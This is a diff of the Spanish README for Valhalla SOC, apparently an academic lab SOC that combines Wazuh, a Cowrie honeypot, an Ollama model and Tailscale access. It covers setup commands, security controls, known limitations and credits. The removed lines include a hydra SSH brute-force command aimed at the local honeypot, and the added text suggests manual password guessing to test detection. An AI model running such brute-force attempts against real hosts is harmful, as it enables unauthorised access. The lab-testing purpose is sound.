+# En la máquina del SOC, con Tailscale instalado y "HTTPS Certificates" activado en el panel de Tailscale
+docker compose --profile tailscale up -d ts-whois          # identidad de cada sesión
+sudo tailscale set --snat-subnet-routes=false               # que Valhalla vea la IP real de cada dispositivo
+sudo tailscale serve --bg --https=443 http://127.0.0.1:3000 # https://<máquina>.<tailnet>.ts.net
 
-# Fuerza bruta (con hydra)
-hydra -l root -P wordlist.txt ssh://localhost:2222
+# Desde la VPN, solo HTTPS: cierra a Tailscale los puertos de Docker (persistente)
+sudo install -m 755 scripts/vpn-firewall.sh /usr/local/sbin/valhalla-vpn-firewall
+sudo install -m 644 scripts/valhalla-vpn-firewall.service /etc/systemd/system/
+sudo systemctl daemon-reload && sudo systemctl enable --now valhalla-vpn-firewall
 ```
 
----
-
-## Dashboards y Visualizaciones
-
-### Dashboard 1: Cowrie Honeypot (Tiempo Real)
-> `https://localhost/app/dashboards#/view/valhalla-soc-cowrie`
-- Contador de alertas críticas
-- Distribución por severidad
-- Timeline de eventos
-- Top 10 IPs atacantes
-- Comandos ejecutados
-
-### Dashboard 2: Reportes de Seguridad
-> `https://localhost/app/dashboards#/view/valhalla-soc-reports`
-- Alertas por nivel diario
-- Resumen por regla
-- Cobertura MITRE ATT&CK
-
-### 7 Monitores en Tiempo Real (cada 5 min)
-
-| Monitor | Severidad |
-|---|---|
-| Brute Force SSH | CRÍTICO |
-| Login Exitoso en Honeypot | CRÍTICO |
-| Descarga de Malware | CRÍTICO |
-| Reverse Shell / C2 | CRÍTICO |
-| Evasión de Defensa | CRÍTICO |
-| Volumen Anómalo (50+ eventos) | CRÍTICO |
-| Persistencia (crontab) | ALTO |
-
----
-
-### Comunicación y Colaboración (Real-Time)
-- **Chat de Operadores**: Sistema basado en WebSockets para comunicación instantánea entre múltiples navegadores o equipos.
-- **Persistencia Total**: Historial de chat almacenado en base de datos para no perder mensajes al refrescar o cambiar de sesión.
-- **Notificaciones Visuales**: Alertas luminosas (Neon Red) cuando hay mensajes nuevos para el operador.
-
-### Inteligencia de Amenazas (Threat Intelligence)
-- **Watchlist de IOCs**: Registro persistente de IPs, Hashes y Dominios maliciosos detectados mediante el modelo de datos unificado.
-- **Bloqueo Directo**: Botón "Bloquear en Firewall" integrado directamente en la interfaz de análisis de indicadores.
-- **Integración con VirusTotal**: Análisis profundo de indicadores con reportes detallados cargados en tiempo real desde la API.
-
----
-
-## Estructura del Proyecto
-
-```
-Valhalla-SOC/
-├── docker-compose.yml ← Orquestación de servicios
-├── .env.example ← Variables de entorno
-├── README.md ← Este archivo
-├── MANUAL.md ← Manual de usuario completo
-│
-├── config/
-│ ├── certs.yml ← Definición de nodos para certs
-│ └── wazuh_indexer_ssl_certs/ ← Certificados TLS
-│
-├── cowrie_config/
-│ ├── cowrie.cfg ← Configuración del honeypot
-│ └── userdb.txt ← Credenciales trampa
-│
-├── wazuh_config/
-│ ├── ossec.conf ← Config principal Wazuh
-│ ├── decoders/ ← Parseo de logs Cowrie
-│ ├── rules/ ← Reglas de detección
-│ └── integrations/
-│ ├── custom-ollama.py ← Integración Ollama IA
-│ └── custom-valhalla.py ← Integración backend
-│
-├── create_dashboards.py ← Crear dashboards Cowrie
-├── setup_monitors.py ← Crear monitores de alertas
-└── setup_reports.py ← Crear reportes de seguridad
-```
-
----
-
-## Aplicación de Escritorio (Standalone)
-
-Valhalla SOC incluye una versión nativa para Windows basada en **Electron**. Esta arquitectura ha sido diseñada para garantizar la continuidad de las operaciones tácticas, permitiendo el acceso a la consola de control incluso en escenarios de desconexión total o fallo en los servicios centrales (Wazuh/Docker).
-
-### Características Principales:
-- **Disponibilidad Continua (Modo Offline):** El sistema detecta automáticamente la pérdida de conexión con el backend y activa un modo de emergencia. Esto permite acceder a la interfaz y consultar los procedimientos operativos (Runbooks) almacenados localmente.
-- **Entorno Seguro:** Ejecución en un contenedor de escritorio aislado con políticas de seguridad optimizadas para la comunicación local.
-- **Despliegue Simplificado:** Generación de un instalador `.exe` autónomo con la identidad visual oficial de Valhalla SOC.
-
-### Instalación y Compilación:
-Para generar tu propio ejecutable de escritorio:
-
-```bash
-cd frontend
-npm install
-npm run build:exe
-```
-
-El instalador final se generará en la ruta: `frontend/dist_electron/Valhalla SOC Setup 0.1.0.exe`
-
----
-
-## Preguntas Frecuentes (FAQ)
-
-<details>
-<summary><b> Generales</b></summary>
-
-**¿Necesito saber programar?** No. Solo ejecutar comandos básicos en la terminal.
-
-**¿Es legal poner un honeypot?** Sí, siempre que sea en tu propia red.
-
-**¿Puede dañar mi ordenador?** No. Todo corre dentro de Docker (contenedores aislados).
-
-**¿Funciona en Windows/Linux/Mac?** Sí, en los tres.
+En `.env`: `VALHALLA_PUBLIC_URL=https://<máquina>.<tailnet>.ts.net`, esa misma dirección en `CORS_ORIGINS` y, para que «Invitar» genere el enlace de Tailscale, `TAILSCALE_API_KEY` (un *API access token* `tskey-api-…`, no una *auth key*).
 
 </details>
 
-<details>
-<summary><b> Sobre Ollama y la IA</b></summary>
+**Probar la detección:** con el perfil `labs` el atacante ya lanza ataques periódicos. A mano: `ssh root@localhost -p 2222` y unas cuantas contraseñas; en segundos aparece en SIEM y en Honeypots, y tras varios intentos salta la regla de fuerza bruta.
 
-**¿Es obligatorio Ollama?** No. El sistema funciona sin él, pero no tendrás análisis IA.
+## <img src="docs/assets/icons/shield-check.svg" width="20" height="20" valign="middle"/> Seguridad
 
-**¿Ollama envía mis datos a internet?** **No.** 100% local.
+Un SOC es un objetivo en sí mismo. Resumen de los controles:
 
-**¿Cuánta RAM necesita Ollama?** ~4-6 GB adicionales para el modelo.
+- **Autenticación**: JWT en cookies `HttpOnly` y `SameSite` (con `Secure` cuando se entra por HTTPS), *refresh* con revocación, protección CSRF de doble cookie y política de contraseñas en altas, cambios y activaciones.
+- **Autorización en el servidor**: cada endpoint comprueba el rol; los mensajes directos solo llegan a sus participantes (antes el filtrado lo hacía el navegador).
+- **Límites por IP real**: la IP se toma de `X-Forwarded-For` solo si la petición viene de un proxy de confianza (consola, nginx, host), recorriendo la cadena desde la derecha. Así no se puede falsificar y cada usuario tiene su propio cupo de intentos de login.
+- **Validación de entradas** con Pydantic: adjuntos del chat (tipos permitidos, 2 MB, base64 verificado), runbooks, monitores, identificadores de agente y consultas de hunting.
+- **WebSocket** con verificación de origen (evita el secuestro entre sitios) y límite de 20 mensajes cada 10 s.
+- **Auditoría** de toda acción que modifica datos, con usuario, IP real y resultado; nunca se guarda el cuerpo de la petición (contraseñas, claves).
+- **Secretos fuera del repositorio**: `.env` y certificados se generan en cada instalación; los enlaces de invitación se guardan como SHA-256.
+- **Acciones destructivas** (borrar, bloquear) exigen mantener pulsado el botón.
 
-**¿Puedo usar otro modelo?** Sí. Cambia `OLLAMA_MODEL` en `.env`. Alternativas: `llama3:8b`, `mistral:7b`.
+## <img src="docs/assets/icons/triangle-alert.svg" width="20" height="20" valign="middle"/> Limitaciones conocidas
 
-**¿Qué pasa si Ollama no está corriendo?** Las alertas siguen funcionando, solo falta el análisis IA.
+- **Vulnerabilidades por equipo**: el escáner de Wazuh 4.9 analiza los equipos, pero su índice (`wazuh-states-vulnerabilities-*`) aún no se llena en esta instalación; Activos lo muestra como «pendiente» en lugar de inventar cifras. La inteligencia de CVE (CISA KEV) funciona con independencia de esto.
+- **Mapa de ataques**: en el laboratorio todas las IPs son privadas y no se pueden geolocalizar; el mapa lo indica en lugar de situarlas en un país.
+- **IA en CPU**: el modelo de 3B es rápido de desplegar pero lento generando (~3 palabras/s) y limitado en razonamiento; sirve para redactar, no para decidir.
+- **Consola de Wazuh** con certificado autofirmado (aviso del navegador en `https://localhost`).
+- **Comandos en el honeypot**: los accesos por Telnet no están dejando registro de los comandos ejecutados; está en revisión.
 
-</details>
+## <img src="docs/assets/icons/folder-tree.svg" width="20" height="20" valign="middle"/> Estructura
 
-<details>
-<summary><b> Sobre Wazuh</b></summary>
+```
+valhalla-soc/
+│
+├── 🖥️  frontend/app/src/        Consola React 19 + Vite
+│   ├── ui/                       Secciones (SIEM, Honeypots, Bifröst, Informes, Usuarios…)
+│   ├── ui/premium/               Sistema de diseño: tokens, vidrio, bordes de acento, móvil
+│   ├── ui/intel/                 Inteligencia: IOCs, vulnerabilidades, mapa
+│   ├── lib/                      Cliente de la API
+│   └── store/                    Estado global (Redux Toolkit)
+│
+├── ⚙️  backend/app/              API FastAPI
+│   ├── main.py                   Endpoints, WebSocket, sesiones, invitaciones
+│   ├── report_builder.py         Informe SOC y ejecutivo
+│   ├── grc_builder.py            Informe GRC: riesgo, NIST CSF, ATT&CK, multinorma
+│   ├── cve_enrich.py             CVE: NVD, GitHub y Exploit-DB con prioridad calculada
+│   ├── hunting.py                Consultas de threat hunting
+│   ├── honeypot.py               Sesiones de Cowrie reconstruidas
+│   ├── tailscale.py              Identidad VPN e invitaciones de Tailscale
+│   └── runbooks_seed.py          Los 20 runbooks NIST
+│
+├── 🛡️  wazuh_config/            ossec.conf, reglas y decodificadores propios
+├── 🍯 cowrie_config/ honeypot/   Configuración del honeypot
+├── 🗡️  attacker/                 Atacante automático del laboratorio
+├── 🔐 tailscale-whois/          Puente de solo lectura a tailscaled
+├── 📜 scripts/                   setup_env · gen_certs · wazuh_post_install · vpn-firewall · reset_admin
+├── 📄 docs/                      Documentación, capturas e iconos
+│
+├── docker-compose.yml            Stack completo (perfiles: labs, tailscale, prod)
+├── install.sh · install.ps1      Instalación desde cero
+└── .env.example                  Variables documentadas
+```
 
-**Niveles de alerta:**
+## <img src="docs/assets/icons/scale.svg" width="20" height="20" valign="middle"/> Licencia
 
-| Nivel | Significado |
-|---|---|
-| 0-4 | Bajo / Informativo |
-| 5-7 | Medio |
-| 8-9 | Alto |
-| 10-12 | Muy Alto |
-| 13-15 | Crítico |
+Distribuido bajo licencia [GPLv2](LICENSE) · © 2026 Equipo Valhalla SOC.
 
-**¿Qué es MITRE ATT&CK?** Base de conocimiento que clasifica técnicas de ataque (ej: T1110 = Fuerza bruta).
+Componentes de terceros: Wazuh (GPLv2), Cowrie (BSD-3-Clause), Ollama (MIT), el modelo Qwen2.5-3B-Instruct ([Qwen Research License](https://huggingface.co/Qwen/Qwen2.5-3B-Instruct/blob/main/LICENSE): uso de investigación, no comercial; para un despliegue comercial hay que cambiar de modelo con `OLLAMA_MODEL`), FastAPI (MIT), React (MIT), OpenSearch (Apache 2.0), Leaflet (BSD-2) con teselas de Esri. Iconografía de la consola y de este README: [Lucide](https://lucide.dev) (ISC).
 
-</details>
+## <img src="docs/assets/icons/user-round.svg" width="20" height="20" valign="middle"/> Autores
 
-<details>
-<summary><b> Problemas Comunes</b></summary>
+<table>
+<tr>
+<td width="50%" valign="top">
 
-**Contenedores se reinician** → Falta RAM. Necesitas ≥8 GB libres para Docker.
+<table>
+<tr><td align="center">
+<img src="https://avatars.githubusercontent.com/u/238087465?v=4" alt="Yoandy Ramírez Delgado" width="96"/><br/>
+<b>Yoandy Ramírez Delgado</b><br/>
+<sub>Creador y mantenedor · Junior Pentester · eJPTv2 · AI Governance (ISO 42001) · SysAdmin</sub><br/>
+<a href="https://www.linkedin.com/in/yoandyrd92/">LinkedIn</a> · <a href="https://github.com/heindall92">GitHub</a> · <a href="https://yoandyramirez.com">Portafolio</a> · <a href="https://profile.hackthebox.com/profile/019c5812-b4ca-7315-b12f-14db6d2b42fa">HackTheBox</a>
+</td></tr>
+<tr><td align="center">
+<img src="https://avatars.githubusercontent.com/u/153531806?v=4" alt="Rosalino Martínez" width="96"/><br/>
+<b>Rosalino Martínez</b><br/>
+<sub>Full Stack Dev &amp; Cybersecurity Analyst</sub><br/>
+<a href="https://github.com/Rosalinowastaken">GitHub</a>
+</td></tr>
+<tr><td align="center">
+<img src="https://avatars.githubusercontent.com/u/206676927?v=4" alt="Julieta Tenti" width="96"/><br/>
+<b>Julieta Tenti</b><br/>
+<sub>Equipo Valhalla SOC</sub><br/>
+<a href="https://github.com/julitenti">GitHub</a>
+</td></tr>
+</table>
 
-**No accedo al Dashboard** → Espera 3-5 min. Verifica con `docker compose ps`.
+</td>
+<td width="50%" valign="top">
 
-**Certificado da error** → Normal. Es auto-firmado. Acepta la excepción.
+<table>
+<tr><td align="center">
+<img src="https://avatars.githubusercontent.com/u/90797615?v=4" alt="Santi Prada" width="96"/><br/>
+<b>Santi Prada</b><br/>
+<sub>Equipo Valhalla SOC</sub><br/>
+<a href="https://github.com/saantiidp">GitHub</a>
+</td></tr>
+<tr><td align="center">
+<img src="https://avatars.githubusercontent.com/u/240470051?v=4" alt="svisomar-SP" width="96"/><br/>
+<b>svisomar-SP</b><br/>
+<sub>Equipo Valhalla SOC</sub><br/>
+<a href="https://github.com/svisomar-SP">GitHub</a>
+</td></tr>
+</table>
 
-**Ollama no analiza** → Verifica: `curl http://localhost:11434`
+</td>
+</tr>
+</table>
 
-**¿Cómo paro todo?** → `docker compose down`
-
-**¿Cómo borro todo?** → `docker compose down -v`
-
-</details>
-
----
-
-## Licencia y Créditos
-
-| Tecnología | Licencia | Web |
-|---|---|---|
-| Wazuh | GPLv2 | [wazuh.com](https://wazuh.com) |
-| Cowrie | MIT | [github.com/cowrie](https://github.com/cowrie/cowrie) |
-| Ollama | MIT | [ollama.ai](https://ollama.ai) |
-| Docker | Apache 2.0 | [docker.com](https://docker.com) |
-
----
-
-*Proyecto académico desarrollado durante el Master en Ciberseguridad de [Evolve](https://evolve.es).*
-
----
+¿Encontraste un problema? Abre una *issue* o escribe a <a href="mailto:yoandyramirezdelgado@gmail.com">yoandyramirezdelgado@gmail.com</a>.
 
 ![footer](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,2,5,30&height=120&section=footer&animation=twinkling)
 
 <div align="center">
 
-** Valhalla SOC** — *Donde los ataques vienen a morir*
-
-[![Made with](https://img.shields.io/badge/Made_with--red?style=flat-square)]()
-[![Powered by Ollama](https://img.shields.io/badge/Powered_by-Ollama_AI-black?style=flat-square&logo=ollama)]()
+**Valhalla SOC** — *Donde los ataques vienen a morir*
 
 </div>
